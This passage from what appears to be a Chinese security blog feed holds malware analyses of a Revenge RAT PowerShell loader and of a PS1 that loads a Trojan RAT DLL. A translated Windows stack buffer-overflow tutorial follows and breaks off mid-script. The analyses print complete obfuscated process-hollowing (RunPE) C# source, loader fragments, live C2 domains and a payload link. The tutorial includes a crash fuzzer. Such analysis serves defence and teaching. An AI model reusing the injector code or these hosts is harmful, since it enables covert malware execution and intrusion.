[byte[]]$Httldxx1s1s3d4f5v5}${\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`}  -&gt; IEX${!!!} -&gt; IEX&amp;( ([sTRIng]$vERbOsepreFERENcE)[1,3]+&#39;x&#39;-jOIN&#39;&#39;) -&gt; IEX</code></pre><p>第一行的混淆最终结果是这样的<br><img src="https://z3.ax1x.com/2021/05/15/g61h8I.png" alt=""></p><p>第四行混淆<br><img src="https://z3.ax1x.com/2021/05/15/g61qaQ.png" alt=""></p><p>第七行混淆<br><img src="https://z3.ax1x.com/2021/05/15/g61jGn.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/15/g63prT.png" alt=""></p><p>最终解密得到后的ps1</p><pre><code>sal g $ekltktekdkqjfdkfdkfkdfksdksdkvckkerkewtekrtekyekw0000[String]$CXCXxcxsderrewrttyrghbvvbc=&quot;&lt;BIN_HEX&gt;&quot;Function maxdooom {    [CmdletBinding()]    [OutputType([byte[]])]    param(        [Parameter(Mandatory=$true)] [String]$zXaWVPi    )    $Httldxx1s1s3d4f5v5 = New-Object -TypeName byte[] -ArgumentList ($zXaWVPi.Length / 2)    for ($i = 0; $i -lt $zXaWVPi.Length; $i += 2) {        $Httldxx1s1s3d4f5v5[$i / 2] = [Convert]::ToByte($zXaWVPi.Substring($i, 2), 16)    }    return [byte[]]$Httldxx1s1s3d4f5v5}[String]$Cmder2021=&quot;&lt;BIN_HEX&gt;&quot;</code></pre><h2 id="NET文件"><a href="#NET文件" class="headerlink" title=".NET文件"></a>.NET文件</h2><p>$CXCXxcxsderrewrttyrghbvvbc变量存的PE是Revenge RAT，上次就分析过这里了略过，分析链接：<a href="https://422926799.github.io/posts/43591be7.html">https://422926799.github.io/posts/43591be7.html</a><br><img src="https://z3.ax1x.com/2021/05/15/g63Zxx.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/15/g63mM6.png" alt=""></p><p>$Cmder2021变量里的存的PE则是读取资源文件内存加载<br><img src="https://z3.ax1x.com/2021/05/15/g63nsK.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/15/g63uqO.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/15/g63MZD.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/15/g63GRI.png" alt=""></p><p>资源文件<br><img src="https://z3.ax1x.com/2021/05/15/g63Jzt.png" alt=""></p><h2 id="URLS"><a href="#URLS" class="headerlink" title="URLS"></a>URLS</h2><p><a href="http://azulviagens.online" target="_blank" rel="noopener">http://azulviagens.online</a><br>Cdtpitbull.hopto.org</p><h2 id="HASHES"><a href="#HASHES" class="headerlink" title="HASHES"></a>HASHES</h2><p>Initial attack document<br>91611ac2268d9bf7b7cb2e71976c630f6b4bfdbb68774420bf01fd1493ed28c7</p><p>Initial attack document<br>77d6651de47bff4c24fc26fa018ea648b0e14e276e8240fae6b1724b8638c46a</p><p>1.docx(template)<br>338b2d8d76f4028bfbd177127371b2509971606553d606c534316dc40cfa8fb9</p><p>Microsoft_Excel_Macro-Enabled_Worksheet.xlsm<br>32f1a502126b1932e1def04b98d8be235c8d25ef7268f8cb35d460cd073a88b2</p><p>A.txt<br>4b65e5785692950f8100b22f2827d65ba93e99dd717eb444af035e96fcd84763</p><p>opera.ps1<br>03f5ff9b6a6b24f76799cc15fe3f1fbf1ca9d6dda30a4154125ed5dd5834290c</p><p>Revenge RAT<br>73f113a6146224c4a1f92f89055922a28322787c108e30000a0a420fa46ed9e2</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参考链接：&lt;a href=&quot;https://www.uptycs.com/blog/revenge-rat-targeting-users-in-south-america&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.uptycs</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>ps1加载Trojan RAT dll分析</title>
    <link href="http://422926799.github.io/posts/43591be7.html"/>
    <id>http://422926799.github.io/posts/43591be7.html</id>
    <published>2021-05-09T05:53:36.000Z</published>
    <updated>2021-05-09T06:49:44.971Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在群里看到个ps1的链接，没事干下载下来分析了一下<br>感觉挺有意思，ps1链接:<a href="https://pastebin.com/raw/7Ze9v4qa" target="_blank" rel="noopener">https://pastebin.com/raw/7Ze9v4qa</a></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>原ps1内容，一眼看去关键的地方经过了混淆<br><img src="https://z3.ax1x.com/2021/05/09/gJOqZd.png" alt=""></p><p>手动解密，最终得到的内容如下<br><img src="https://z3.ax1x.com/2021/05/09/gJXCLQ.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/05/09/gJX0wd.png" alt=""></p><p>$RUNPE变量是加密的csahrp源码<br>$Bytes是加密的RAT DLL</p><p>该ps1的功能如下:<br>       0.延时1秒</p><pre><code>1. StartupCheck环境变量存在的话写入vbs调用INSTALL函数    * %Startup%环境变量不存在调用CodeDom函数1. CodeDom函数功能    1. 解密gzip压缩的cs源码的内容    2. 利用csc编译成dll    3. 利用InstallUtil.exe调用dll里的Execute函数-&gt;Execute(string path, byte[] payload)加载Trojan RAT dll</code></pre><p>powershell ISE断点分析:<br><img src="https://z3.ax1x.com/2021/05/09/gJXcSf.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/09/gJXgl8.png" alt=""></p><p>火绒剑动态运行监控:<br><img src="https://z3.ax1x.com/2021/05/09/gJXROg.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/09/gJXfmQ.png" alt=""></p><p>解密出来的cs源码分析：</p><pre><code class="csharp">using System;using System.Diagnostics;using System.Runtime.InteropServices;using Microsoft.VisualBasic;namespace projFUD{    public static class PA    {        public static string ReverseString(string Str)        {            string Revstr = &quot;&quot;;            int Length;            Length = Str.Length - 1;            while (Length &gt;= 0)            {                Revstr = Revstr + Str[Length];                Length--;            }            return Revstr;        }        public static string BinaryToString(string str)        {            string chars = System.Text.RegularExpressions.Regex.Replace(str, &quot;[^01]&quot;, &quot;&quot;);            byte[] arr = new byte[(chars.Length / 8) - 1 + 1];            for (int i = 0; i &lt;= arr.Length - 1; i++)                arr[i] = Convert.ToByte(chars.Substring(i * 8, 8), 2);            return System.Text.ASCIIEncoding.ASCII.GetString(arr);        }        private delegate int DelegateResumeThread(IntPtr handle);        private delegate bool DelegateWow64SetThreadContext(IntPtr thread, int[] context);        private delegate bool DelegateSetThreadContext(IntPtr thread, int[] context);        private delegate bool DelegateWow64GetThreadContext(IntPtr thread, int[] context);        private delegate bool DelegateGetThreadContext(IntPtr thread, int[] context);        private delegate int DelegateVirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);        private delegate bool DelegateWriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);        private delegate bool DelegateReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);        private delegate int DelegateZwUnmapViewOfSection(IntPtr process, int baseAddress);        private delegate bool DelegateCreateProcessA(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes,            bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref StartupInformation startupInfo, ref ProcessInformation processInformation);        private static string[] AL = Convert.ToString(&quot;0011001000110011011011000110010101101110011100100110010101101011|0110110001101100011001000111010001101110|011001000110000101100101011100100110100001010100011001010110110101110101011100110110010101010010|011101000111100001100101011101000110111001101111010000110110010001100001011001010111001001101000010101000111010001100101010100110011010000110110011101110110111101010111|01110100011110000110010101110100011011100110111101000011011001000110000101100101011100100110100001010100011101000110010101010011|011101000111100001100101011101000110111001101111010000110110010001100001011001010111001001101000010101000111010001100101010001110011010000110110011101110110111101010111|01110100011110000110010101110100011011100110111101000011011001000110000101100101011100100110100001010100011101000110010101000111|0111100001000101011000110110111101101100011011000100000101101100011000010111010101110100011100100110100101010110|011110010111001001101111011011010110010101001101011100110111001101100101011000110110111101110010010100000110010101110100011010010111001001010111|0111100101110010011011110110110101100101010011010111001101110011011001010110001101101111011100100101000001100100011000010110010101010010|0110111001101111011010010111010001100011011001010101001101100110010011110111011101100101011010010101011001110000011000010110110101101110010101010111011101011010|0100000101110011011100110110010101100011011011110111001001010000011001010111010001100001011001010111001001000011|&quot;).Split(new string[] { &quot;|&quot; }, StringSplitOptions.None);        private static string Kernel32 = BinaryToString(AL[0]);        private static string ntdll = BinaryToString(AL[1]);        private static string RsmThread = BinaryToString(AL[2]);        private static string Wow64SetThreadCtx = BinaryToString(AL[3]);        private static string SetThreadCtx = BinaryToString(AL[4]);        private static string Wow64GetThreadCtx = BinaryToString(AL[5]);        private static string GetThreadCtx = BinaryToString(AL[6]);        private static string VirtualAllcEx = BinaryToString(AL[7]);        private static string WriteProcessMem = BinaryToString(AL[8]);        private static string ReadProcessMem = BinaryToString(AL[9]);        private static string ZwUnmapViewOfSec = BinaryToString(AL[10]);        private static string CreateProcA = BinaryToString(AL[11]);        private static readonly DelegateResumeThread ResumeThread = LoadApi&lt;DelegateResumeThread&gt;(ReverseString(Kernel32), ReverseString(RsmThread));        private static readonly DelegateWow64SetThreadContext Wow64SetThreadContext = LoadApi&lt;DelegateWow64SetThreadContext&gt;(ReverseString(Kernel32), ReverseString(Wow64SetThreadCtx));        private static readonly DelegateSetThreadContext SetThreadContext = LoadApi&lt;DelegateSetThreadContext&gt;(ReverseString(Kernel32), ReverseString(SetThreadCtx));        private static readonly DelegateWow64GetThreadContext Wow64GetThreadContext = LoadApi&lt;DelegateWow64GetThreadContext&gt;(ReverseString(Kernel32), ReverseString(Wow64GetThreadCtx));        private static readonly DelegateGetThreadContext GetThreadContext = LoadApi&lt;DelegateGetThreadContext&gt;(ReverseString(Kernel32), ReverseString(GetThreadCtx));        private static readonly DelegateVirtualAllocEx VirtualAllocEx = LoadApi&lt;DelegateVirtualAllocEx&gt;(ReverseString(Kernel32), ReverseString(VirtualAllcEx));        private static readonly DelegateWriteProcessMemory WriteProcessMemory = LoadApi&lt;DelegateWriteProcessMemory&gt;(ReverseString(Kernel32), ReverseString(WriteProcessMem));        private static readonly DelegateReadProcessMemory ReadProcessMemory = LoadApi&lt;DelegateReadProcessMemory&gt;(ReverseString(Kernel32), ReverseString(ReadProcessMem));        private static readonly DelegateZwUnmapViewOfSection ZwUnmapViewOfSection = LoadApi&lt;DelegateZwUnmapViewOfSection&gt;(ReverseString(ntdll), ReverseString(ZwUnmapViewOfSec));        private static readonly DelegateCreateProcessA CreateProcessA = LoadApi&lt;DelegateCreateProcessA&gt;(ReverseString(Kernel32), ReverseString(CreateProcA));        [DllImport(&quot;kernel32&quot;, SetLastError = true)]        private static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);        [DllImport(&quot;kernel32&quot;, CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]        private static extern IntPtr GetProcAddress(IntPtr hProcess, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);        private static CreateApi LoadApi&lt;CreateApi&gt;(string name, string method)        {            return (CreateApi)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref name), ref method), typeof(CreateApi));        }        [StructLayout(LayoutKind.Sequential, Pack = 1)]        private struct ProcessInformation        {            public readonly IntPtr ProcessHandle;            public readonly IntPtr ThreadHandle;            public readonly uint ProcessId;            private readonly uint ThreadId;        }        [StructLayout(LayoutKind.Sequential, Pack = 1)]        private struct StartupInformation        {            public uint Size;            private readonly string Reserved1;            private readonly string Desktop;            private readonly string Title;            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]            private readonly byte[] Misc;            private readonly IntPtr Reserved2;            private readonly IntPtr StdInput;            private readonly IntPtr StdOutput;            private readonly IntPtr StdError;        }        public static void Execute(string path, byte[] payload) //傀儡进程实现        {            for (int i = 0; i &lt; 5; i++)            {                int readWrite = 0;                StartupInformation si = new StartupInformation();                ProcessInformation pi = new ProcessInformation();                si.Size = UInt32.Parse(Marshal.SizeOf(typeof(StartupInformation)).ToString());                string ToInt32 = System.Text.Encoding.Default.GetString(new byte[] { 0x54, 0x6F, 0x49, 0x6E, 0x74, 0x33, 0x32 });                string ToInt16 = System.Text.Encoding.Default.GetString(new byte[] { 0x54, 0x6F, 0x49, 0x6E, 0x74, 0x31, 0x36 });                try                {                    if (!CreateProcessA(path, string.Empty, IntPtr.Zero, IntPtr.Zero, false, 4 | 134217728, IntPtr.Zero, null, ref si, ref pi)) throw new Exception(); //创建进程                    int fileAddress = (int)Interaction.CallByName(typeof(BitConverter).GetMethod(ToInt32), BinaryToString(&quot;010010010110111001110110011011110110101101100101&quot;), CallType.Method, new object[] { null, new object[] { payload, (30 * 2) } });                    int imageBase = (int)Interaction.CallByName(typeof(BitConverter).GetMethod(ToInt32), BinaryToString(&quot;010010010110111001110110011011110110101101100101&quot;), CallType.Method, new object[] { null, new object[] { payload, fileAddress + (26 * 2) } });                    int[] context = new int[Convert.ToInt32(89 + 90)];                    context[0] = 65538;                    if (IntPtr.Size == 4) //如果字节为4位（32位）                    { if (!GetThreadContext(pi.ThreadHandle, context)) throw new Exception(); } //检索指定线程的上下文                    else //64位                    { if (!Wow64GetThreadContext(pi.ThreadHandle, context)) throw new Exception(); } //来检索WOW64线程的上下文                    int ebx = context[(20 + 21)];                    int baseAddress = 0;                    if (!ReadProcessMemory(pi.ProcessHandle, ebx + 8, ref baseAddress, 4, ref readWrite)) throw new Exception(); //读取内存                    if (imageBase == baseAddress)                        if (ZwUnmapViewOfSection(pi.ProcessHandle, baseAddress) != 0) throw new Exception();                    int sizeOfImage = (int)typeof(BitConverter).GetMethod(ToInt32).Invoke(null, new object[] { payload, fileAddress + 80 });                    int sizeOfHeaders = (int)typeof(BitConverter).GetMethod(ToInt32).Invoke(null, new object[] { payload, fileAddress + 84 });                    bool allowOverride = false;                    int newImageBase = VirtualAllocEx(pi.ProcessHandle, imageBase, sizeOfImage, 12288, 64);                    if (newImageBase == 0) throw new Exception();                    if (!WriteProcessMemory(pi.ProcessHandle, newImageBase, payload, sizeOfHeaders, ref readWrite)) throw new Exception();                    int sectionOffset = fileAddress + 248;                    short numberOfSections = BitConverter.ToInt16(payload, fileAddress + 6);                    for (int I = 0; I &lt; numberOfSections; I++)                    {                        int virtualAddress = (int)typeof(BitConverter).GetMethod(ToInt32).Invoke(null, new object[] { payload, sectionOffset + 12 });                        int sizeOfRawData = (int)typeof(BitConverter).GetMethod(ToInt32).Invoke(null, new object[] { payload, sectionOffset + 16 });                        int pointerToRawData = (int)typeof(BitConverter).GetMethod(ToInt32).Invoke(null, new object[] { payload, sectionOffset + 20 });                        if (sizeOfRawData != 0)                        {                            byte[] sectionData = new byte[sizeOfRawData];                            Buffer.BlockCopy(payload, pointerToRawData, sectionData, 0, sectionData.Length);                            if (!WriteProcessMemory(pi.ProcessHandle, newImageBase + virtualAddress, sectionData, sectionData.Length, ref readWrite)) throw new Exception();                        }                        sectionOffset += 40;                    }                    byte[] GB = BitConverter.GetBytes(newImageBase);                    if (!WriteProcessMemory(pi.ProcessHandle, ebx + 8, GB, 4, ref readWrite)) throw new Exception();                    int addressOfEntryPoint = (int)Interaction.CallByName(typeof(BitConverter).GetMethod(ToInt32), BinaryToString(&quot;010010010110111001110110011011110110101101100101&quot;), CallType.Method, new object[] { null, new object[] { payload, fileAddress + 40 } });                    if (allowOverride) newImageBase = imageBase;                    context[44] = newImageBase + addressOfEntryPoint;                    if (IntPtr.Size == 4)                    {                        var x = SetThreadContext(pi.ThreadHandle, context);                        if (!x)                        {                            throw new Exception();                        }                    }                    else                    {                        var y = Wow64SetThreadContext(pi.ThreadHandle, context);                        if (!y)                        {                            throw new Exception();                        }                    }                    int r = (int)Interaction.CallByName(ResumeThread, BinaryToString(&quot;010010010110111001110110011011110110101101100101&quot;), CallType.Method, new object[] { pi.ThreadHandle });                    if (r == -1 * 1)                    {                        throw new Exception();                    }                }                catch                {                    Process.GetProcessById(Convert.ToInt32(pi.ProcessId)).Kill(); //执行失败的话返回当前进程PID并杀死                    continue;                }                break;            }        }    }}</code></pre><p>cs主要实现傀儡进程，加载Trojan RAT的dll，如果执行失败的话返回当前进程PID并杀死</p><p>Trojan RAT DLL分析:<br>Main函数入口点分析</p><pre><code>1. 延时2.5秒2. 创建flag互斥体    * 创建flag互斥体    * 互斥体创建失败则退出1. 调用PreventSleep.Run()函数 【防止系统在应用程序运行时进入睡眠状态或关闭显示器】2. Application.ApplicationExit （在应用程序即将关闭时发生）-&gt;调用Config.programMutex.ReleaseMutex() 释放互斥锁3. 调用Client.RUN()函数</code></pre><p><img src="https://z3.ax1x.com/2021/05/09/gJXj0J.png" alt=""></p><p>PreventSleep.Run函数<br><img src="https://z3.ax1x.com/2021/05/09/gJji6O.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/09/gJjAne.png" alt=""></p><p>Config<br><img src="https://z3.ax1x.com/2021/05/09/gJjK9P.png" alt=""></p><p>Client.RUN函数分析:</p><pre><code>1. 创建多线程调用Client.TcpReceive函数2. 检测Client.isConnected是否为true（默认为False），如果为false释放所有缓冲区。将收集到的系统信息发送到kimjoy.ddns.net，并将Client.isConnected设置为true。创建一个计时器，该计时器在30秒钟后调用Client.Ping函数。然后创建新的缓冲区，如果上述操作失败将Client.isConnected设置为False</code></pre><p><img src="https://z3.ax1x.com/2021/05/09/gJjNhq.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/09/gJjDuF.png" alt=""></p><pre><code>1. 进入循环2. 检测socket状态是否为读取状态模式(Client.client.Poll(-1, SelectMode.SelectRead))和获取返回的值(Client.client.Available)是否成功或者连接(!Client.client.Connected)是否成功，如果其中一项失败退出循环3. 指定缓冲区</code></pre><pre><code>byte[] array = new byte[Client.client.Available];Interaction.CallByName(Client.client, &quot;Receive&quot;, CallType.Method, new object[]{    array,    0,    array.Length,    SocketFlags.None}); //连接的Socket上接收数据之前的数据缓冲区，偏移量，大小和套接字标志</code></pre><pre><code>1. 判断缓冲区里是否存在!@#%^NYAN#!@$ （存在!@#%^NYAN#!@$）2. </code></pre><p>接收到发送来的数据后写入缓冲区 Client.memoryStream.Write(array, 0, array.Length);</p><pre><code>    * 存在的话则从MemoryStream解密内容 Array[] array2 = (Array[])Client.PacketFixer(Client.memoryStream.ToArray(), Config.splitter);    * 实例化PacketHandler类 PacketHandler @object = new PacketHandler();        * 线程池实例化PacketHandler.Handler函数 Thread thread = new Thread(new ParameterizedThreadStart(@object.Handler));    * 将缓冲区里的首位字符串传入PacketHandler.Handler函数作为参数，启用线程池 thread.Start(array2[0])    * 释放缓冲区 Client.memoryStream.Dispose()    * 新建缓冲区Client.memoryStream = new MemoryStream();    * 解密后的数组长度不为2则退出循环    * 在将解密数组的1位元素写入新的缓冲区 Client.memoryStream.Write((byte[])array2[1], 0, ((byte[])array2[1]).Length)1. 缓冲区里不存在!@#%^NYAN#!@$* 设置socket连接状态为false并退出循环 Client.isConnected = false;break</code></pre><p><img src="https://z3.ax1x.com/2021/05/09/gJjg41.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/09/gJjW36.png" alt=""></p><p>SendInfo函数分析<br>(每个功能都使用config.key进行分割)</p><pre><code>* IdGenerator.GetHardDiskSerialNumber()当前盘符数量* IdGenerator.GetIp()获取当前机器IP* 获取主机名Environment.MachineName和用户名Environment.UserName* IdGenerator.GetCamera()检索捕获驱动程序的版本说明* new ComputerInfo().OSFullName获取系统名称和当前所有进程IdGenerator.GetSystem()* IdGenerator.GetCpu()获取当前CPU名称* ComputerInfo().TotalPhysicalMemory物理内存总量* IdGenerator.GetAV()通过wmic查询检测杀毒* config.port* IdGenerator.GetActiveWindow()获取当前窗口标题* 当前线程区域性的名称CultureInfo.CurrentCulture.Name</code></pre><p><img src="https://z3.ax1x.com/2021/05/09/gJjb4I.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/09/gJvSbQ.png" alt=""></p><p>PacketHandler.Handler函数<br>根据解密的数组的0位元素做出对应的判断</p><pre><code>* 如果array[0]==&quot;PNC&quot; ，重置计时器，开始计时，发送PNC字符串给远程服务器* 如果array[0]==&quot;P&quot;，停止计时器，发送P字符串+config.key+Config.stopwatch.ElapsedMilliseconds（计时器的运行时间），并发送W字符串+config.key+当前窗口标题* 如果array[0]==&quot;IE&quot;，打开注册表HKEY_CURRENT_USER\SOFTWARE\RXQLV8XYTDNHNSA\array[1]，如果存在该注册表路径调用Invoke函数（this.Invoke(Config.host, Config.port, array[4], array[5], StringConverter.Encode(StringConverter.Decode(Config.id) + &quot;_&quot; + IdGenerator.GetHardDiskSerialNumber())），并从注册表HKEY_CURRENT_USER\SOFTWARE\RXQLV8XYTDNHNSA\array[1]，读取指定的内容，并将array[1]转换为布尔值，跳转到IL_395，如果注册表路径不存在，发送GPL字符串+config.key+array[5]+key+array[1]+key+false字符串，跳转到IL_395执行* 如果array[0]==&quot;LP&quot;执行invoke函数this.Invoke(Config.host, Config.port, array[1], array[2], StringConverter.Encode(StringConverter.Decode(Config.id) + &quot;_&quot; + IdGenerator.GetHardDiskSerialNumber()), array[3], int.Parse(array[4]), Convert.ToBoolean(array[5]), array[6], Convert.ToBoolean(array[7]))* 如果array[0]==&quot;UNV&quot;调用GetAssembly加载发送来的程序集调用</code></pre><p><img src="https://z3.ax1x.com/2021/05/09/gJvlP1.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/09/gJvYrD.png" alt=""><br><img src="https://i.bmp.ovh/imgs/2021/05/020fc9e4e3003092.png" alt=""></p><p>invoke函数<br>bytes=&gt;CreateInstance<br>bytes2=&gt;Start<br>加载对应的程序集调用，创建对应的注册表设置键值<br><img src="https://z3.ax1x.com/2021/05/09/gJxEFA.png" alt=""><br><img src="https://z3.ax1x.com/2021/05/09/gJxZWt.png" alt=""></p><p>GetAssembly函数<br>bytes=&gt;SLoad<br>加载程序集之前先base64解码，gzip流解压。在加载<br><img src="https://z3.ax1x.com/2021/05/09/gJxmSP.png" alt=""></p><p>微步情报<br><img src="https://z3.ax1x.com/2021/05/09/gYSBGR.png" alt=""></p><p>请求信息<br><img src="https://z3.ax1x.com/2021/05/09/gYpaOf.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在群里看到个ps1的链接，没事干下载下来分析了一下&lt;br&gt;感觉挺有意思，ps1链接:&lt;a href=&quot;https://pastebin.co</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>windows缓冲区溢出学习</title>
    <link href="http://422926799.github.io/posts/ee8c55e.html"/>
    <id>http://422926799.github.io/posts/ee8c55e.html</id>
    <published>2021-05-07T12:50:23.000Z</published>
    <updated>2021-05-07T13:08:48.032Z</updated>
    
    <content type="html"><![CDATA[<p>原文链接:<a href="https://www.hackingarticles.in/a-beginners-guide-to-buffer-overflow/" target="_blank" rel="noopener">https://www.hackingarticles.in/a-beginners-guide-to-buffer-overflow/</a><br>算是翻译文</p><h2 id="什么是缓冲区溢出？"><a href="#什么是缓冲区溢出？" class="headerlink" title="什么是缓冲区溢出？"></a>什么是缓冲区溢出？</h2><p>缓冲区是易失性的内存分配，它们在将数据从一个位置传输到另一位置时临时保存数据。当正在处理的数据超出存储缓冲区的存储容量时，将发生缓冲区溢出。这导致程序覆盖相邻存储器位置中的过大数据，从而导致缓冲区溢出。当我们对char类型的缓冲区进行操作时，将发生缓冲区溢出。</p><p>我们将通过一些示例来尝试理解这个概念。例如，缓冲区的设计方式是接受8个字节的数据，在这种情况下，如果用户输入的数据超过8个字节，则超过8个字节的数据将覆盖相邻的内存，从而超过分配的缓冲区边界。最终将产生分段错误，随后出现许多其他错误，从而导致程序执行被终止。</p><h2 id="缓冲区溢出的类型"><a href="#缓冲区溢出的类型" class="headerlink" title="缓冲区溢出的类型"></a>缓冲区溢出的类型</h2><p>缓冲区溢出有两种类型。让我们讨论两者的简短介绍。</p><p><strong>堆栈缓冲区溢出/Vanilla Buffer缓冲区溢出</strong><br>当程序覆盖缓冲区边界之外的程序的调用堆栈上的内存地址时，就会发生这种情况，缓冲区边界的长度是固定的。在堆栈缓冲区溢出中，多余的数据将被写入位于堆栈上的相邻缓冲区中。由于与堆栈上溢出的相邻内存位置中的内存损坏相关的错误，通常会导致应用程序崩溃。</p><p><strong>堆缓冲区溢出</strong><br>堆是用于管理动态内存分配的内存结构。它通常用于分配在编译时未知大小的内存，因为所需的内存量太大，以致于无法将其装入堆栈中。堆溢出或溢出是堆数据区域中发生的一种缓冲区溢出。基于堆的溢出利用不同于基于堆栈的溢出利用。堆上的内存在运行时动态分配，通常包含程序数据。通过以特定方式破坏此数据以使应用程序覆盖内部结构（如链接列表指针）来完成利用。</p><p><strong>堆栈缓冲区溢出攻击</strong><br>最常见的缓冲区溢出攻击称为基于堆栈的缓冲区溢出攻击或普通缓冲区溢出攻击，通常由一个堆栈构成，直到且除非程序需要用户输入，例如用户名或密码，否则堆栈为空。然后，程序将返回存储器地址写入堆栈，然后将用户的输入存储在堆栈顶部。处理堆栈时，用户的输入将发送到程序指定的返回地址。</p><p><img src="https://z3.ax1x.com/2021/05/07/g3jWi6.png" alt=""></p><p>但是，在开始时会为堆栈分配特定数量的内存，这使其变得有限。如果用户输入的数据大于堆栈中分配的内存量，并且程序没有适当的输入验证，可以验证所提供的数据是否适合分配的内存，则将导致在溢出。<br>如果堆栈缓冲区中填充了不受信任用户提供的数据，则用户可以以将恶意可执行代码注入正在运行的程序并控制进程的方式来破坏堆栈。</p><h2 id="Windows缓冲区溢出攻击"><a href="#Windows缓冲区溢出攻击" class="headerlink" title="Windows缓冲区溢出攻击"></a>Windows缓冲区溢出攻击</h2><p>Buffer Overflow可在包括Linux，Windows和其他各种平台的不同平台上工作，因为它处理内存而不是基于内存的内容。由于要在Linux上处理内存寄存器可能有点困难，因此我们先做出明智的选择，首先了解具有可执行文件的Windows机器上的缓冲区溢出的各个步骤和技术，然后再继续进行操作。</p><p>这里属于堆栈溢出</p><p>在Windows设备上的缓冲区溢出攻击的演示中，我们将使用容易受到缓冲区溢出攻击的公共Windows应用程序。<br>示例exe：<a href="https://github.com/justinsteven/dostackbufferoverflowgood/blob/master/dostackbufferoverflowgood.exe" target="_blank" rel="noopener">https://github.com/justinsteven/dostackbufferoverflowgood/blob/master/dostackbufferoverflowgood.exe</a><br>调试工具：<a href="https://debugger.immunityinc.com/ID_register.py" target="_blank" rel="noopener">https://debugger.immunityinc.com/ID_register.py</a><br>此exe为32位，没开启ASLR（windows开启ASLR后没法绕）<br><img src="https://z3.ax1x.com/2021/05/07/g3j4zD.png" alt=""></p><p>（原本想使用OD的，但是崩溃的时候OD的ESP没有给出内容）<br>管理员权限运行Immunity Debugger<br>将exe拖入Immunity Debugger，F9运行 （运行dostackbufferoverflowgood.exe会开启31337端口）<br><img src="https://z3.ax1x.com/2021/05/07/g3josH.png" alt=""></p><p>nmap扫描<br><img src="https://z3.ax1x.com/2021/05/07/g3jTLd.png" alt=""></p><p>Fuzz测试崩溃需要的bytes</p><pre><code class="python">import socketstring=b&quot;\x41&quot; * 10ip=&quot;10.23.75.128&quot;port=31337s=socket.socket()s.connect((ip,port))s.settimeout(5)while True:    try:        print(&quot;Fuzz with {} bytes&quot;.format(len(string)))        s.sendall(string+b&quot;\x0a\x0d&quot;)        string+=b&quot;\x41&quot; * 10        s.recv(1024)    except:        print(&quot;Fuzzer stop at {} bytes&quot;.format(len(string)))        exit(0)s.close()</code></pre><p><img src="https://z3.ax1x.com/2021/05/07/g3jOFP.png" alt=""></p><p>在Immunity Debugger中检查进程状态，则可以看到该应用程序现在处于暂停状态。要注意的另一件事是ESP寄存器中的A溢出。这确认了如果我们在其中发送160个A或160字节的数据，应用程序将崩溃。<br><img src="https://z3.ax1x.com/2021/05/07/g3jXJf.png" alt=""></p><p>寄存器介绍：<br>EAX –这是一个累加器寄存器，用于执行算术计算，如加，减，比较和存储函数调用的返回值。<br>ECX –该寄存器的作用类似于用于迭代的计数器，它以递减的方式计数。<br>EDX –该寄存器保存额外的数据，以执行复杂的计算，例如乘法和除法。它充当EAX寄存器的扩展。<br>EBX –它是没有任何定义用途的基址寄存器，可用于存储数据。<br>ESP –它是堆栈指针。它指示当前指令在内存中的位置。它始终指向堆栈的顶部。<br>EBP –它是指向堆栈基础的基础指针。<br>ESI –被称为源索引寄存器，用于保存输入数据的位置。<br>EDI –它是目标索引寄存器，指向存储已处理数据结果的位置。<br>EIP –它是指令指针寄存器。它是一个只读寄存器，其中保存要读取的下一条指令的地址。</p><p><strong>偏移发现和控制EIP</strong><br>EIP偏移量是一个确切的值，它为我们提供了以下信息：多少字节将填充缓冲区并溢出到返回地址（EIP）中。<br>控制EIP是缓冲区溢出攻击的一个非常关键的部分，因为EIP是最终将指向我们的恶意代码以便可以执行的寄存器。在对应用程序进行模糊测试时，我们看到它崩溃了160个字节，这意味着EIP位于1到160个字节之间。因此，我们将在MSF中使用模式创建工具，该工具会生成某些字节的模式，这将引导我们找到确切的偏移值。我们将生成一个200字节的模式。多出40个字节，以进行一些额外的填充。</p><pre><code>msf-pattern_create -l 200</code></pre><p><img src="https://z3.ax1x.com/2021/05/07/g3vpLj.png" alt=""></p><p>重加载程序<br>发送测试</p><pre><code class="python">import 